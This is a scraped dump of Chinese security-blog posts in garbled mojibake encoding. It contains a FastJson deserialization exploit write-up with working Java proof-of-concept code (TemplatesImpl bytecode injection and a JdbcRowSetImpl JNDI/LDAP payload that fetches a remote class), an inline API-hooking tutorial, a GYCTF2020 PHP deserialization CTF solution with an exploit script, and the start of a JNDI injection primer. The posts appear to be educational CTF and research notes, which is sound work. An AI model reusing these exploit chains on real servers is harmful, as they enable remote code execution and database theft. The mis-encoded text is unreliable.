¼å¼æ‰èƒ½è§¦å‘æ¼æ´ï¼š `JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);`2. æœåŠ¡ç«¯ä½¿ç”¨parse()æ—¶ï¼Œéœ€è¦`JSON.parse(text1,Feature.SupportNonPublicField);` jdk7u21ååºåˆ—åŒ–çš„åˆ©ç”¨æ¡ä»¶ 123451.æ¶æ„ç±»çš„çˆ¶ç±»å¿…é¡»ä¸ºABSTRACT_TRANSLET 2.TemplatesImplç±»çš„_bytecodesä¸ä¸ºnullï¼Œä¸ºæ¶æ„ç±»å­—èŠ‚ç ï¼Œpayloadå†™åœ¨æ¶æ„ç±»çš„é™æ€æ–¹æ³•æˆ–æ„é€ æ–¹æ³•3.TemplatesImplç±»çš„_nameä¸ä¸ºnull4.TemplatesImplç±»çš„_class=null5._tfactoryéœ€è¦æ˜¯ä¸€ä¸ªæ‹¥æœ‰getExternalExtensionsMap()æ–¹æ³•çš„ç±»ï¼Œå³TransformerFactoryImpl()ï¼Œä»¥æ­¤æ¥å…¼å®¹ä¸åŒç‰ˆæœ¬ æ„é€ expï¼ŒFastJsonååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹_bytecodesã€_tfactoryç­‰å±æ€§è¿›è¡Œäº†æ“ä½œï¼Œéœ€è¦å¦å¤–å¤„ç† 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.*;import org.apache.commons.codec.binary.Base64;public class Test { public static byte[] getevilbyte() throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.makeClass(&quot;Evil&quot;); //å‘é™æ€æ–¹æ³•ä¸­æ’å…¥è¦æ‰§è¡Œçš„å‘½ä»¤ ctClass.makeClassInitializer().insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;); //è®¾ç½®æ»¡è¶³æ¡ä»¶çš„çˆ¶ç±» ctClass.setSuperclass((pool.get(AbstractTranslet.class.getName()))); //è·å–å­—èŠ‚ç  byte[] EvilByteCodes = ctClass.toBytecode(); return EvilByteCodes; } public static void main(String[] args) throws Exception { //ç”Ÿæˆæ¶æ„ç±»å­—èŠ‚ç  byte[] evilCode = getevilbyte(); //å°†å­—èŠ‚ç è¿›è¡Œbase64ç¼–ç  String evilCode_base64 = Base64.encodeBase64String(evilCode); String text1 = &quot;{&quot;+ &quot;\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\&quot;,&quot;+ &quot;\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+evilCode_base64+&quot;\\&quot;],&quot;+ &quot;'_name':'xx',&quot;+ &quot;'_tfactory':{ },&quot;+ &quot;'_outputProperties':{ }&quot;+ &quot;}\\n&quot;; System.out.println(text1); //å¤„ç†privateå±æ€§ ParserConfig config = new ParserConfig(); //ååºåˆ—åŒ– Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); }} _bytecodes_bytecodesä¼ è¾“è¿‡ç¨‹ä¸­ä¼šç»è¿‡base64è§£ç ï¼Œæ‰€ä»¥åœ¨payloadä¸­éœ€è¦è¿›è¡Œbase64ç¼–ç  FieldDeserializer#parseField parseFieldä¸­å¯¹_bytecodesä¸­çš„å†…å®¹è¿›è¡Œäº†è§£æ deserialize parseArray ObjectDeserializer#deserializer byteValue å¯¹_bytecodesè¿›è¡Œbase64è§£ç  _tfactoryFastJsonä¼šè‡ªåŠ¨æ–°å»ºä¸€ä¸ªç¬¦åˆè¦æ±‚çš„å¯¹è±¡å®ä¾‹ï¼Œæ‰€ä»¥expä¸­_factoryä¸º{} 1/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java JdbcRowSetImplå‰é¢æåˆ°äº†FastJsonååºåˆ—åŒ–ä¼šè‡ªåŠ¨è°ƒç”¨ç±»ä¸­ç¬¦åˆè§„åˆ™çš„ç‰¹å®šçš„setterå’Œgetteræ–¹æ³•ã€‚com.sun.rowset.JdbcRowSetImplçš„setAutoCommit()æ–¹æ³•ä¸­è°ƒç”¨äº†lookup()ï¼Œä¸”å‚æ•°DataSourceNameå¯æ§ï¼Œç”±setDataSourceName()æ–¹æ³•è®¾ç½®ã€‚ç”±äºè¿™ä¸¤ä¸ªæ–¹æ³•éƒ½ç¬¦åˆè§„åˆ™ï¼Œååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸¤ä¸ªsetteræ–¹æ³•é€ æˆJNDIæ³¨å…¥ï¼Œè¿›è€Œè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ JdbcRowSetImpl#setDataSourceName è°ƒç”¨çˆ¶ç±»çš„setDataSourceName BaseRowSet#setDataSourceName çˆ¶ç±»çš„setDataSourceNameï¼ŒæŠŠvar1èµ‹å€¼ç»™dataSoruce setAutoCommit è¿™é‡Œè°ƒç”¨äº†connect()æ–¹æ³•ï¼Œvar1æ¥æºäºPOCä¸­æ„é€ çš„å±æ€§autoCommitï¼Œå®é™…æµ‹è¯•ä¸­å‘ç°è¿™ä¸ªå€¼å¯ä»¥æ˜¯trueä¹Ÿå¯ä»¥æ˜¯falseï¼Œåªè¦ä¿è¯æœ‰ä¸€ä¸ªå¸ƒå°”ç±»å‹çš„å‚æ•°ä¼ å…¥å°±ä¸ä¼šå½±å“æ­£å¸¸æ‰§è¡Œã€‚ connection è°ƒç”¨lookupï¼Œthis.getDataSourceName()ç­‰äºvar1ï¼Œæ¥ç€è¯·æ±‚æˆ‘ä»¬çš„ldapæœåŠ¡å™¨ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œ æ¥ä¸‹æ¥å°±æ˜¯JNDIæ³¨å…¥åˆ©ç”¨çš„æ€è·¯äº† ä½¿ç”¨marshalsecæ­å»ºldapæœåŠ¡å™¨ 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8090/#ExecTest ExecTest 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.io.Reader;import javax.print.attribute.standard.PrinterMessageFromOperator;public class ExecTest { public ExecTest() throws IOException,InterruptedException{ String cmd=&quot;calc&quot;; final Process process = Runtime.getRuntime().exec(cmd); printMessage(process.getInputStream());; printMessage(process.getErrorStream()); int value=process.waitFor(); System.out.println(value); } private static void printMessage(final InputStream input) { // TODO Auto-generated method stub new Thread (new Runnable() { @Override public void run() { // TODO Auto-generated method stub Reader reader =new InputStreamReader(input); BufferedReader bf = new BufferedReader(reader); String line = null; try { while ((line=bf.readLine())!=null) { System.out.println(line); } }catch (IOException e){ e.printStackTrace(); } } }).start(); } public static void main(String[] args) { }} æŠŠç¼–è¯‘åçš„æ¶æ„ç±»ExecTest.classæ”¾åˆ°webç›®å½•ä¸‹ï¼Œç„¶åå¼€å¯webæœåŠ¡ åˆ©ç”¨ 123456789101112131415import com.alibaba.fastjson.JSON;public class Test { public static void main(String[] args) throws Exception { String payload = &quot;{\\n&quot; + &quot; \\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\n&quot; + &quot; \\&quot;dataSourceName\\&quot;:\\&quot;ldap://192.168.111.129:1389/ExecTest\\&quot;,\\n&quot; + &quot; \\&quot;autoCommit\\&quot;:true\\n&quot; + &quot;}&quot;; JSON.parseObject(payload); }} å®é™…æ‰§è¡Œçš„ä»£ç  12345678910import com.sun.rowset.JdbcRowSetImpl;public class CLIENT { public static void main(String[] args) throws Exception { JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl(); JdbcRowSetImpl_inc.setDataSourceName(&quot;ldap://192.168.111.129:1389/ExecTest&quot;); JdbcRowSetImpl_inc.setAutoCommit(true); }}","link":"/2021/04/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"Inline Hook(å†…è”é’©å­)","text":"åŸç†APIå‡½æ•°ä¿å­˜åœ¨æ“ä½œç³»ç»Ÿçš„DLLæ–‡ä»¶ä¸­ï¼Œåœ¨è¿è¡Œç¨‹åºåç¨‹åºä¼šå°†APIæ‰€åœ¨çš„DLLåŠ è½½å…¥è¿›ç¨‹ä¸­ï¼Œå½“åœ¨ç¨‹åºä¸­ä½¿ç”¨æŸä¸ªAPIå‡½æ•°æ—¶ã€‚è¿™æ ·ç¨‹åºå°±ä¼šåƒè°ƒç”¨è‡ªå·±çš„å‡½æ•°ä¸€æ ·è°ƒç”¨APIï¼Œå¤§ä½“è¿‡ç¨‹å¦‚å›¾1æ‰€ç¤ºã€‚ å›¾1 è°ƒç”¨APIå‡½æ•°çš„å¤§ä½“è¿‡ç¨‹ ä»å›¾1ä¸­å¯ä»¥çœ‹å‡ºï¼Œåœ¨è¿›ç¨‹ä¸­å½“EXEæ¨¡å—è°ƒç”¨CreateFile()å‡½æ•°çš„æ—¶å€™ï¼Œä¼šå»è°ƒç”¨kernel32.dllæ¨¡å—ä¸­çš„CreateFile()å‡½æ•°ï¼Œå› ä¸ºçœŸæ­£çš„CreateFile()å‡½æ•°çš„å®ç°åœ¨kernel32.dllæ¨¡å—ä¸­ã€‚ CreateFile()æ˜¯APIå‡½æ•°ï¼ŒAPIå‡½æ•°ä¹Ÿæ˜¯ç”±äººç¼–å†™çš„ä»£ç å†ç¼–è¯‘è€Œæˆçš„ï¼Œä¹Ÿæœ‰å…¶å¯¹åº”çš„äºŒè¿›åˆ¶ä»£ç ã€‚æ—¢ç„¶æ˜¯ä»£ç ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¢«ä¿®æ”¹ã€‚é€šè¿‡ä¸€ç§â€œé‡è›®â€çš„æ–¹æ³•æ¥ç›´æ¥ä¿®æ”¹APIå‡½æ•°åœ¨å†…å­˜ä¸­çš„æ˜ åƒï¼Œä»è€Œå¯¹APIå‡½æ•°è¿›è¡ŒHOOKã€‚ä½¿ç”¨çš„æ–¹æ³•æ˜¯ï¼Œç›´æ¥ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤çš„jmpæŒ‡ä»¤å°†å…¶ä»£ç æ‰§è¡Œæµç¨‹æ”¹å˜ï¼Œè¿›è€Œæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œè¿™æ ·å°±ä½¿åŸæ¥çš„å‡½æ•°çš„æµç¨‹æ”¹å˜äº†ã€‚æ‰§è¡Œå®Œæˆ‘ä»¬çš„æµç¨‹ä»¥åï¼Œå¯ä»¥é€‰æ‹©æ€§åœ°æ‰§è¡ŒåŸæ¥çš„å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ä¸ç»§ç»­æ‰§è¡ŒåŸæ¥çš„å‡½æ•°ã€‚ å‡è®¾è¦å¯¹æŸè¿›ç¨‹çš„kernel32.dllçš„CreateFile()å‡½æ•°è¿›è¡ŒHOOKï¼Œé¦–å…ˆéœ€è¦åœ¨æŒ‡å®šè¿›ç¨‹ä¸­çš„å†…å­˜ä¸­æ‰¾åˆ°CreateFile()å‡½æ•°çš„åœ°å€ï¼Œç„¶åä¿®æ”¹CreateFile()å‡½æ•°çš„é¦–åœ°å€çš„ä»£ç ä¸ºjmpMyProcçš„æŒ‡ä»¤ã€‚è¿™æ ·ï¼Œå½“æŒ‡å®šçš„è¿›ç¨‹è°ƒç”¨CreateFile()å‡½æ•°æ—¶ï¼Œå°±ä¼šé¦–å…ˆè·³è½¬åˆ°æˆ‘ä»¬çš„å‡½æ•°å½“ä¸­å»æ‰§è¡Œæµç¨‹ï¼Œè¿™æ ·å°±å®Œæˆäº†æˆ‘ä»¬çš„HOOKäº†ã€‚ ç”±äºè¿™ç§æ–¹æ³•æ˜¯åœ¨ç¨‹åºæµç¨‹ä¸­ç›´æ¥è¿›è¡ŒåµŒå…¥jmpæŒ‡ä»¤æ¥æ”¹å˜æµç¨‹çš„ï¼Œæ‰€ä»¥å°±æŠŠå®ƒå«åšInline Hookã€‚ å®ç°Inline Hookæ˜¯åœ¨ç¨‹åºä¸­åµŒå…¥äº†jmpæŒ‡ä»¤ç„¶åè·³è½¬åˆ°æˆ‘ä»¬çš„ç¨‹åºæµç¨‹ä¸­ç»§ç»­æ‰§è¡Œçš„ï¼ŒjmpæŒ‡ä»¤çš„ç”¨æ³•æ˜¯jmp ç›®çš„åœ°å€ï¼Œå‡5æ˜¯å› ä¸ºjmp xxxxæŒ‡ä»¤æœºå™¨ç é•¿5ä¸ªå­—èŠ‚ jmpåçš„åç§»é‡ = ç›®çš„åœ°å€ - æºåœ°å€ - 5 ç›®çš„åœ°å€ï¼šé’©å­å‡½æ•°åœ°å€ æºåœ°å€ï¼šè¦HOOKçš„å‡½æ•°åœ°å€ æ¢³ç†ä¸€ä¸‹æˆ‘ä»¬å†…è”é’©å­çš„æµç¨‹ï¼š æ„é€ jmpæŒ‡ä»¤ åœ¨å†…å­˜ä¸­æ‰¾åˆ°æƒ³è¦HOOKçš„å‡½æ•°åœ°å€ï¼Œå¹¶ä¿å­˜ä¸ºHOOKä½ç½®å¤„çš„å‰5ä¸ªå­—èŠ‚ å°†æ„é€ çš„è·³è½¬æŒ‡ä»¤å†™å…¥éœ€è¦HOOKçš„ä½ç½® å½“HOOKä½ç½®è¢«æ‰§è¡Œæ—¶ä¼šè·³è½¬åˆ°æˆ‘ä»¬çš„æ‰§è¡Œæµç¨‹ å¦‚æœè¦ç»§ç»­åŸæ¥çš„æµç¨‹ï¼Œé‚£ä¹ˆå–æ¶ˆHOOKï¼Œä¹Ÿå°±æ˜¯è¿˜åŸè¢«ä¿®æ”¹çš„å­—èŠ‚ æ‰§è¡ŒåŸæ¥çš„æµç¨‹ ç»§ç»­HOOKä½åŸæ¥çš„ä½ç½® ä»£ç å…ˆå°è£…ä¸€ä¸ªCILHookç±»ï¼Œ å¤´æ–‡ä»¶CILHook.h 123456789101112131415161718192021#pragma once#include &lt;Windows.h&gt;#include &lt;tchar.h&gt;class CILHook{public: CILHook(); ~CILHook(); BOOL Hook(LPCTSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc); void UnHook(); BOOL ReHook();private: FARPROC m_pfnOrig; BYTE m_bOldBytes[5]; BYTE m_bNewBytes[5];//m_bNewBytes[0] = '\\xe9'ï¼Œä¸ºjmpçš„æœºå™¨ç ï¼Œm_bNewBytesä¸ºjmpæŒ‡ä»¤}; CILHook.cpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &quot;CILHook.h&quot;CILHook::CILHook(){ m_pfnOrig = NULL; ZeroMemory(m_bNewBytes, 5); ZeroMemory(m_bOldBytes, 5);}CILHook::~CILHook() { UnHook();}//æœ¬è´¨å°±æ˜¯æŠŠUser32.dllä¸­çš„MessageBoxçš„åœ°å€æ¢æˆé’©å­å‡½æ•°åœ°å€//æ¨¡å—å pszModuleName, å‡½æ•°å pszFuncName, é’©å­å‡½æ•° pfnHookFuncBOOL CILHook::Hook(LPCWSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc) { BOOL bRet = FALSE; //è·å–æŒ‡å®šæ¨¡å—ä¸­å‡½æ•°çš„åœ°å€ï¼ŒUser32.dllä¸­çš„MessageBox m_pfnOrig = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName); if (m_pfnOrig != NULL) { //ä¿å­˜è¯¥åœ°å€å¤„5ä¸ªå­—èŠ‚çš„å†…å®¹åˆ°m_bOldBytes DWORD dwNum = 0; ReadProcessMemory(GetCurrentProcess(), (LPCVOID)m_pfnOrig, m_bOldBytes, 5, &amp;dwNum); m_bNewBytes[0] = '\\xe9';//jmpçš„æœºå™¨ç  //pfnhookfuncæ˜¯HOOKåçš„ç›®æ ‡åœ°å€ï¼Œm_pfnOrigæ˜¯åŸæ¥çš„åœ°å€ï¼Œ5æ˜¯æŒ‡ä»¤é•¿åº¦ *(DWORD*)(m_bNewBytes + 1) = (DWORD)pfnHookFunc - (DWORD)m_pfnOrig - 5; WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, 5, &amp;dwNum); bRet = TRUE; } return bRet;}//è§£é™¤Hookvoid CILHook::UnHook(){ BOOL bRet = FALSE; if (!m_pfnOrig != 0) { DWORD dwNum = 0; WriteProcessMemory(GetCurrentProcess(), m_pfnOrig, m_bNewBytes, 5, &amp;dwNum); bRet = TRUE; } }BOOL CILHook::ReHook() { BOOL bRet = FALSE; if (m_pfnOrig != 0) { DWORD dwNum = 0; WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, 5, &amp;dwNum); bRet = TRUE; } return bRet;} ä¸»ç¨‹åºä»£ç  12345678910111213141516171819202122#include &lt;iostream&gt;#include &quot;CILHook.h&quot;CILHook MsgHook;//é’©å­å‡½æ•°ï¼Œå¼¹å‡ºå†…å®¹ä¸ºHOOKçš„å¯¹è¯æ¡†int WINAPI MyMessageBoxW(HWND hWnd,LPCWSTR lpText,LPCWSTR lpCaption,UINT uType) { MsgHook.UnHook(); MessageBox(NULL, _T(&quot;Hook&quot;), lpCaption, uType);//é’©å­å‡½æ•°å¼¹å‡ºHook MsgHook.ReHook(); return 0;}int main(){ //hookåçš„MessageBox MsgHook.Hook(_T(&quot;User32.dll&quot;), &quot;MessageBoxA&quot;, (FARPROC)MyMessageBoxW); MessageBox(NULL, _T(&quot;test&quot;), _T(&quot;test&quot;), MB_OK);//å¦‚æœæˆåŠŸï¼Œå¼¹å‡ºçš„å†…å®¹ä¸æ˜¯testè€Œæ˜¯Hookã€‚ MsgHook.UnHook(); return 0;} åˆ©ç”¨è¿‡ç¨‹åœ¨windows 10ä¸­æµ‹è¯•å¤±è´¥ï¼Œä»ç„¶æ‰§è¡Œæ­£å¸¸çš„MessageBoxå‡½æ•°ï¼ŒåŸå› æ˜¯windows 10æ“ä½œç³»ç»Ÿä¸­é‡‡ç”¨ASLR(åœ°å€éšæœºåŒ–)ï¼Œç”¨å…¬å¼è®¡ç®—å‡ºæ¥çš„åç§»åœ°å€æ˜¯æ— æ•ˆçš„ï¼Œæ‰€ä»¥æ— æ³•jmpåˆ°é’©å­å‡½æ•°æ‰§è¡Œã€‚è€Œä¸”åœ¨å¤šçº¿ç¨‹ç³»ç»Ÿä¸­ï¼Œå¯èƒ½æœ‰æŸä¸ªçº¿ç¨‹å°±åœ¨è¿™ä¸ªæ—¶å€™è°ƒç”¨äº†ä¿®æ”¹çš„ç³»ç»Ÿå‡½æ•°ï¼Œé€ æˆæ— æ³•é¢„æœŸçš„ç»“æœã€‚åœ¨windows 10ä¸­ï¼Œå¯ä»¥ä½¿ç”¨å¾®è½¯çš„ä¸€ä¸ªè½»é‡çº§çš„å¼€æºåº“â€”â€”detoursæ¥å®ŒæˆHookã€‚ ä½¿ç”¨detoursè¿›è¡ŒAPI Hookè¿™é‡Œå¯ä»¥ä½¿ç”¨å¾®è½¯çš„ä¸€ä¸ªè½»é‡çº§çš„å¼€æºåº“æ¥å®ŒæˆHookã€‚Detoursæ˜¯å¾®è½¯æä¾›çš„ä¸€ä¸ªå¼€å‘åº“ï¼Œä½¿ç”¨å®ƒå¯ä»¥ç®€å•ã€é«˜æ•ˆã€ç¨³å®šåœ°å®ç°API HOOKçš„åŠŸèƒ½ã€‚ å®‰è£…åœ¨Visual Studioä¸­é€‰æ‹©å·¥å…·-&gt;NuGetåŒ…ç®¡ç†å™¨-&gt;ç¨‹åºåŒ…ç®¡ç†å™¨æ§åˆ¶å° è¾“å…¥å®‰è£…å‘½ä»¤ä¼šè‡ªåŠ¨å®‰è£…Detoursåº“ï¼š 1Install-Package Detours å¯¼å…¥ä»£ç å¦‚ä¸‹ï¼š 12#include &lt;detours.h&gt;#pragma comment (lib,&quot;detours.lib&quot;) ä»£ç 123456789101112131415161718192021222324252627#include &lt;Windows.h&gt;#include &lt;detours.h&gt;#pragma comment (lib,&quot;detours.lib&quot;)static int (WINAPI* OldMesssageBoxA)( HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType ) = MessageBoxA;int WINAPI MyFunction0(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType){ return OldMesssageBoxA(NULL, &quot;Hooked&quot;, &quot;Warning&quot;, MB_OKCANCEL);}int main() { DetourTransactionBegin(); DetourUpdateThread(GetCurrentThread()); DetourAttach(&amp;(PVOID&amp;)OldMesssageBoxA, MyFunction0); DetourTransactionCommit(); MessageBox(NULL, _T(&quot;test&quot;), _T(&quot;test&quot;), MB_OK); return 0;} åˆ©ç”¨è¿‡ç¨‹æˆåŠŸ å…·ä½“å†…å®¹å’Œåˆ©ç”¨å¯è§ æ¸—é€æŠ€å·§â€”â€”ä»è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯æå–æ˜æ–‡å‡­æ® Detours InLine Hook","link":"/2021/02/03/Inline-Hook-%E5%86%85%E8%81%94%E9%92%A9%E5%AD%90/"},{"title":"GYCTF2020 Easyphp","text":"[GYCTF2020]Easyphpååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ ä¸‹è½½www.zipå¼€å§‹å®¡è®¡ ç›®å½•ç»“æ„å¦‚ä¸‹ï¼Œlib.phpä¸­å­˜åœ¨ååºåˆ—åŒ–åˆ©ç”¨é“¾ ååºåˆ—åŒ–1.update.phpå®ä¾‹åŒ–Userç±»å¹¶è°ƒç”¨update() 2.Userç±»çš„updateæ–¹æ³•unserialize($this-&gt;getNewinfo())ï¼Œåºåˆ—åŒ–å†…å®¹æ¥è‡ªäºgetNewinfoæ–¹æ³• 3.Userç±»çš„getNewInfo()æ–¹æ³•ï¼Œå°†Infoç±»åºåˆ—åŒ–ï¼Œå¹¶ä¸”safeå‡½æ•°æ”¹å˜äº†åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå­˜åœ¨å­—ç¬¦é€ƒé€¸ã€‚åªè¦ä¼ å…¥unionï¼Œå°±ä¼šè¢«è‡ªåŠ¨æ›¿æ¢æˆhackerï¼Œpayloadæœ‰å¤šé•¿ï¼Œå°±è¾“å…¥å¤šå°‘ä¸ªunionï¼Œè¿™æ ·å¤šå‡ºæ¥ä¸€ä¸ªå­—ç¬¦ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ»¡è¶³å‰é¢çš„å­—ç¬¦ä¸²é•¿åº¦åï¼Œåé¢çš„è¯­å¥ä»å­—ç¬¦ä¸²ä¸­é€ƒé€¸å‡ºæ¥ï¼ŒæˆåŠŸååºåˆ—åŒ–ã€‚ 4.Infoç±»ä¸­çš„å±æ€§å‡å¯æ§ï¼Œageå±æ€§å’Œnicknameå±æ€§å‡ç”±postä¼ å€¼å¾—åˆ°ã€‚åˆ©ç”¨safeå‡½æ•°å¢åŠ å­—ç¬¦çš„åŠŸèƒ½è¿›è¡Œå­—ç¬¦ä¸²é€ƒé€¸ï¼Œååºåˆ—åŒ–æ¶æ„ç±»UpdateHelperï¼Œè¿™æ ·å³å¯æ‰§è¡Œä»»æ„sqlè¯­å¥ã€‚ æ¶æ„ç±»1.UpdateHelperç±»__destruct()æ–¹æ³•ï¼Œä»¤UpdateHelperç±»çš„sqlå±æ€§ç­‰äºUserç±»è§¦å‘__toString()æ–¹æ³• 2.Userç±»çš„__toString()æ–¹æ³•ï¼Œåªè¦è®©nicknameå±æ€§ç­‰äºInfoç±»å³å¯è§¦å‘__call()æ–¹æ³• 3.Infoç±»çš„__call()æ–¹æ³•,ä»¤å±æ€§CtrlCaseç­‰äºdbCtrlç±»,è°ƒç”¨å…¶ä¸­çš„loginæ–¹æ³•ï¼Œæ‰§è¡Œè¯­å¥$argument[0]å®é™…æ¥æºäºUserç±»çš„ageå±æ€§ 4.dbCtrlç±»çš„loginæ–¹æ³•ï¼Œæ¥æ”¶$sqlå‚æ•°å¹¶æ‰§è¡Œå®ƒï¼Œä¼ å…¥å‚æ•°å¯æ§ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„sqlè¯­å¥ã€‚éœ€è¦ä»¤nameå±æ€§ç­‰äºadminï¼Œç»‘å®šåˆ°sqlè¯­å¥ä¸­çš„?ä¸­ã€‚ç„¶åä»¤tokenå±æ€§ç­‰äºadminï¼Œå³å¯è¿”å›$idResultï¼Œçœ‹åˆ°sqlè¯­å¥æ‰§è¡Œçš„ç»“æœã€‚ åˆ©ç”¨æ„é€ exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass User{ public $id; public $age=&quot;select password,id from user where username=?&quot;; public $nickname;}class Info{ public $age; public $nickname; public $CtrlCase;}Class UpdateHelper{ public $id; public $newinfo; public $sql;}class dbCtrl{ public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;root&quot;; public $database=&quot;test&quot;; public $name=&quot;admin&quot;; public $password; public $mysqli; public $token=&quot;admin&quot;;}$a=new UpdateHelper();$a-&gt;sql=new User();$a-&gt;sql-&gt;nickname=new Info();$a-&gt;sql-&gt;nickname-&gt;CtrlCase=new dbCtrl();$payload='&quot;;s:3:&quot;ccc&quot;;'.serialize($a).'}';//echo $pauload;$p=str_repeat('union',strlen($payload)).$payload;echo $p; 12345678import requestsurl=&quot;http://8f273265-29ea-44e2-afae-70823a82f76f.node3.buuoj.cn/update.php&quot;data={ &quot;age&quot;:'', &quot;nickname&quot;:'unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:3:&quot;ccc&quot;;O:12:&quot;UpdateHelper&quot;:3:{s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}}'}r=requests.post(url=url,data=data)print(r.text) è§£å¯†ç™»é™†åæ‹¿åˆ°flag å‚è€ƒï¼š https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/ https://ctf.ieki.xyz/buuoj/gyctf-2020.html https://www.1ight.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/","link":"/2021/03/27/GYCTF2020-Easyphp/"},{"title":"JNDIæ³¨å…¥","text":"æ¦‚å¿µJNDIJavaå‘½åå’Œç›®å½•æ¥å£ï¼ˆJNDIï¼‰æ˜¯ä¸€ç§Java APIï¼Œç±»ä¼¼äºä¸€ä¸ªç´¢å¼•ä¸­å¿ƒï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯é€šè¿‡nameå‘ç°å’ŒæŸ¥æ‰¾æ•°æ®å’Œå¯¹è±¡ã€‚JNDIæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ¥å£ï¼Œåœ¨è¿™ä¸ªæ¥å£ä¸‹å¯ä»¥å®ç°å¤šç§ç›®å½•ç³»ç»ŸæœåŠ¡ï¼Œå¦‚RMIã€LDAPç­‰ï¼Œå¯ä»¥é€šè¿‡åç§°æŸ¥è¯¢ç›¸å…³å¯¹è±¡ RMIRMIï¼ˆRemote Method Invocationï¼‰ 